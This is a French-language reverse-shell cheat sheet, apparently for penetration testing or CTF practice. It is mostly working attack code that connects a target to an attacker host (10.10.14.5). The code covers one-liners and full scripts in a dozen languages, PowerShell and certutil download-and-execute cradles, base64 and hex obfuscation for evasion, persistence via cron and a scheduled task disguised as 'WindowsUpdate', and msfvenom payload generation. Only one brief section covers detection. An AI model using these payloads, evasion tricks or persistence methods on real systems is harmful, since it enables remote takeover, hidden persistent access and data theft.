# 🐚 Reverse Shells - Guide Complet Cyber Sécurité

Guide exhaustif pour créer, stabiliser et maintenir des reverse shells sur différentes plateformes et langages.

---

## 📖 Concepts de Base

### Qu'est-ce qu'un Reverse Shell ?

Un **reverse shell** est une connexion réseau où la **machine cible** initie la connexion vers la **machine attaquante**, contrairement à un bind shell où l'attaquant se connecte à la cible.

**Avantages** :
- Contourne les pare-feu sortants (plus permissifs que l'entrant)
- Pas besoin d'ouvrir de port sur la cible
- Fonctionne souvent même avec NAT/proxy

**Principe** :
```
[Attaquant] <--- Connexion initiée par --- [Cible]
   (écoute)                                (exécute payload)
```

---

## 1️⃣ Configuration de l'Attaquant

### Listener Netcat (classique)

```bash
# Listener simple
nc -lvnp 4444

# Avec verbosité accrue
nc -lvvnp 4444

# Sur interface spécifique
nc -lvnp 4444 -s 10.10.14.5
```

**Options expliquées** :
- `-l` : Mode écoute (listen)
- `-v` : Mode verbeux (affiche les connexions)
- `-n` : Pas de résolution DNS (plus rapide)
- `-p` : Spécifie le port d'écoute

### Alternatives à Netcat

**1. Socat (plus flexible)**
```bash
# Listener simple
socat TCP-LISTEN:4444,reuseaddr,fork -

# Avec SSL
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0,fork -

# Avec logging
socat TCP-LISTEN:4444,reuseaddr,fork,logfile=connections.log -
```

**2. Pwncat (moderne et riche en fonctionnalités)**
```bash
# Installation
pip install pwncat-cs

# Listener avec auto-stabilisation
pwncat-cs -lp 4444

# Bind à une interface
pwncat-cs -l 10.10.14.5 4444
```

**3. Metasploit Handler**
```bash
msfconsole
use exploit/multi/handler
set payload linux/x64/shell_reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
exploit
```

---

## 2️⃣ Reverse Shells par Langage

### 🐍 Python

**Python 2**
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

**Python 3**
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Python 3 - Version compacte**
```python
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

**Script Python complet (shell.py)**
```python
#!/usr/bin/env python3
import socket
import subprocess
import os

def main():
    HOST = '10.10.14.5'
    PORT = 4444
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    
    # Redirection des descripteurs de fichiers
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr
    
    # Lancer le shell
    subprocess.call(["/bin/bash", "-i"])

if __name__ == "__main__":
    main()
```

---

### 🐚 Bash

**Méthode classique (TCP)**
```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

**Méthode alternative**
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
```

**Via exec (plus furtif)**
```bash
0<&196;exec 196<>/dev/tcp/10.10.14.5/4444; sh <&196 >&196 2>&196
```

**One-liner avec encodage base64**
```bash
echo "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" | base64
# Résultat : YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQo=

# Exécution
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQo= | base64 -d | bash
```

**Via fichier**
```bash
# Créer le script
cat > /tmp/.shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
EOF

# Rendre exécutable et lancer
chmod +x /tmp/.shell.sh
/tmp/.shell.sh
```

---

### 🐧 Netcat

**Netcat traditionnel (avec -e)**
```bash
nc -e /bin/sh 10.10.14.5 4444
nc -e /bin/bash 10.10.14.5 4444
```

**Netcat sans -e (BSD/OpenBSD)**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f
```

**Netcat avec named pipe**
```bash
mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc 10.10.14.5 4444 1>/tmp/backpipe
```

---

### 🟦 PowerShell (Windows)

**One-liner PowerShell**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**PowerShell encodé en base64**
```powershell
# Encoder le payload
$command = 'IEX(New-Object Net.WebClient).downloadString("http://10.10.14.5:8000/shell.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

# Exécuter
powershell -enc $encodedCommand
```

**Nishang Invoke-PowerShellTcp.ps1**
```powershell
# Sur l'attaquant : héberger le script
python3 -m http.server 8000

# Sur la cible : télécharger et exécuter
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 4444
```

**PowerShell via fichier**
```powershell
# shell.ps1
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

---

### 🟨 PHP

**PHP exec**
```php
php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**PHP shell_exec**
```php
php -r '$sock=fsockopen("10.10.14.5",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
```

**PHP system**
```php
php -r '$sock=fsockopen("10.10.14.5",4444);system("/bin/sh -i <&3 >&3 2>&3");'
```

**PHP PentestMonkey (complet)**
```php
<?php
set_time_limit(0);
$ip = '10.10.14.5';
$port = 4444;
$sock = fsockopen($ip, $port);
$descriptors = array(
   0 => $sock,
   1 => $sock,
   2 => $sock
);
$process = proc_open('/bin/sh', $descriptors, $pipes);
proc_close($process);
?>
```

---

### ☕ Java

**Java Runtime**
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.5/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

**Java reverse shell complet**
```java
String host="10.10.14.5";
int port=4444;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();
    Thread.sleep(50);
    try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();s.close();
```

---

### 🟥 Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.10.14.5",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

**Ruby sans /bin/sh**
```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.14.5","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

### 🐪 Perl

```perl
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Perl sans /bin/sh**
```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.5:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

---

### 🔷 Go (Golang)

```go
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.10.14.5:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

---

### 🦀 Rust

```rust
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

fn main() {
    let s = TcpStream::connect("10.10.14.5:4444").unwrap();
    let fd = s.as_raw_fd();
    Command::new("/bin/sh")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}
```

---

## 3️⃣ Stabilisation du Shell

### Méthode 1 : Python PTY

```bash
# Dans le reverse shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Ou Python 2
python -c 'import pty;pty.spawn("/bin/bash")'
```

### Méthode 2 : Stabilisation complète (TTY)

**Étape par étape** :

```bash
# 1. Spawner un PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 2. Background le shell (Ctrl+Z)
^Z

# 3. Configurer le terminal
stty raw -echo; fg

# 4. Réinitialiser le terminal
reset

# 5. Configurer les variables d'environnement
export SHELL=bash
export TERM=xterm-256color
stty rows 38 columns 116
```

**Explication** :
- `python3 -c 'import pty;pty.spawn("/bin/bash")'` : Crée un pseudo-terminal
- `Ctrl+Z` : Met le processus en arrière-plan
- `stty raw -echo` : Configure le terminal pour transmettre toutes les touches
- `fg` : Ramène le processus au premier plan
- `reset` : Réinitialise le terminal
- `export TERM=xterm-256color` : Active les couleurs
- `stty rows X columns Y` : Configure la taille du terminal

### Méthode 3 : Socat

**Sur l'attaquant** :
```bash
# Générer un certificat SSL (optionnel)
openssl req -x509 -newkey rsa:4096 -keyout shell.key -out shell.crt -days 365 -nodes
cat shell.key shell.crt > shell.pem

# Listener socat avec TTY
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

**Sur la cible** :
```bash
# Si socat est disponible
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```

### Méthode 4 : Script

```bash
# Si Python n'est pas disponible
script /dev/null -c bash
```

---

## 4️⃣ Shells Spécialisés

### Windows CMD

```cmd
# Via PowerShell
powershell -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5:8000/shell.ps1')"

# Via certutil (téléchargement)
certutil -urlcache -f http://10.10.14.5:8000/nc.exe nc.exe
nc.exe 10.10.14.5 4444 -e cmd.exe
```

### Lua

```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.14.5','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

### AWK

```bash
awk 'BEGIN {s = "/inet/tcp/0/10.10.14.5/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### NodeJS

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "10.10.14.5", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

---

## 5️⃣ Techniques d'Évasion

### Encodage Base64

```bash
# Encoder le payload
echo "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" | base64

# Exécuter
echo BASE64_STRING | base64 -d | bash
```

### Hex Encoding

```bash
# Encoder
echo -n "/bin/bash" | xxd -p

# Exécuter
echo 2f62696e2f62617368 | xxd -r -p | bash
```

### Obfuscation PowerShell

```powershell
# Utiliser des variables
$h='10.10.14.5'
$p=4444
$c=New-Object System.Net.Sockets.TCPClient($h,$p)
```

### Ports courants (bypass firewall)

```bash
# Utiliser des ports standards
53   # DNS
80   # HTTP
443  # HTTPS
8080 # HTTP alternatif
3389 # RDP
```

---

## 6️⃣ Persistance du Reverse Shell

### Cron Job (Linux)

```bash
# Ajouter au crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'") | crontab -

# Ou directement dans /etc/crontab
echo "*/5 * * * * root bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" >> /etc/crontab
```

### Script de reconnexion

```bash
#!/bin/bash
while true; do
    bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
    sleep 60
done
```

### Windows Scheduled Task

```powershell
schtasks /create /tn "WindowsUpdate" /tr "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/shell.ps1')\"" /sc minute /mo 5
```

---

## 7️⃣ Outils & Générateurs

### Reverse Shell Generator (Web)

**https://www.revshells.com/**
- Interface web pratique
- Génère tous types de shells
- Auto-remplissage IP/Port

### MSFVenom

```bash
# Linux x64
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf

# Windows x64
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe

# PHP
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.jsp

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war
```

### PayloadsAllTheThings

```bash
git clone https://github.com/swisskyrepo/PayloadsAllTheThings
cd PayloadsAllTheThings/Methodology\ and\ Resources/Reverse\ Shell\ Cheatsheet/
```

---

## 8️⃣ Troubleshooting

### Le shell ne fonctionne pas

**Vérifications** :
1. Firewall sur l'attaquant ?
2. Port déjà utilisé ? (`ss -tulpn | grep 4444`)
3. IP correcte ? (`ip a show tun0`)
4. Syntaxe du payload correcte ?
5. Langage disponible sur la cible ?

### Le shell se ferme immédiatement

```bash
# Ajouter une boucle infinie
while true; do bash -i >& /dev/tcp/10.10.14.5/4444 0>&1; sleep 10; done

# Ou rediriger stderr
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 2>&1
```

### Pas de stabilisation possible

```bash
# Utiliser script au lieu de python
script /dev/null -c bash

# Ou utiliser rlwrap côté attaquant
rlwrap nc -lvnp 4444
```

---

## 9️⃣ Sécurité & Détection

### Comment détecter un reverse shell ?

**Indicateurs** :
- Connexions sortantes inhabituelles
- Processus avec redirections réseau (`/dev/tcp`)
- Processus bash/sh lancés par www-data
- Trafic sortant vers des ports non standards

**Outils de détection** :
```bash
# Netstat - connexions actives
netstat -antp | grep ESTABLISHED

# Lsof - fichiers ouverts par processus
lsof -i -n

# Ps - processus suspects
ps auxf | grep -E 'bash|sh' | grep -v grep
```

---

## 🔟 Cheatsheet Rapide

```bash
# Listener
nc -lvnp 4444

# Bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Netcat
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.5 4444 >/tmp/f

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Stabilisation
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
reset
export SHELL=bash TERM=xterm-256color
```

---

## 📚 Ressources

- **RevShells.com** : https://www.revshells.com/
- **PayloadsAllTheThings** : https://github.com/swisskyrepo/PayloadsAllTheThings
- **HackTricks** : https://book.hacktricks.xyz/generic-methodologies-and-resources/shells
- **PentestMonkey** : https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- **GTFOBins** : https://gtfobins.github.io/

---

**Tags:** `#reverse-shell #netcat #bash #python #powershell #stabilization #post-exploitation`
